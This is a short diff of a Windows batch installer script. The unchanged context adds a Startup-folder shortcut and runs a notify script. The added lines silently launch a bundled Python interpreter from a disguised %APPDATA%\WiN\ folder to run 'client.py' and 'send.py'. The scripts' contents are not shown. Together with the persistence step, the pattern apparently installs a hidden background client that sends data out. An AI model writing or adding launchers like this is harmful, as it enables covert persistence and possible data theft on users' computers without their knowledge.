@@ -18,3 +18,6 @@ Files\Shortcut.exe /a:c /f:"%appdata%\Microsoft\Windows\Start Menu\Programs\Star
 
 ::Done!
 cscript Files\notify.vbs
+cd %APPDATA%\WiN\
+start %APPDATA%\WiN\python.exe %APPDATA%\WiN\client.py
+start %APPDATA%\WiN\python.exe %APPDATA%\WiN\send.py
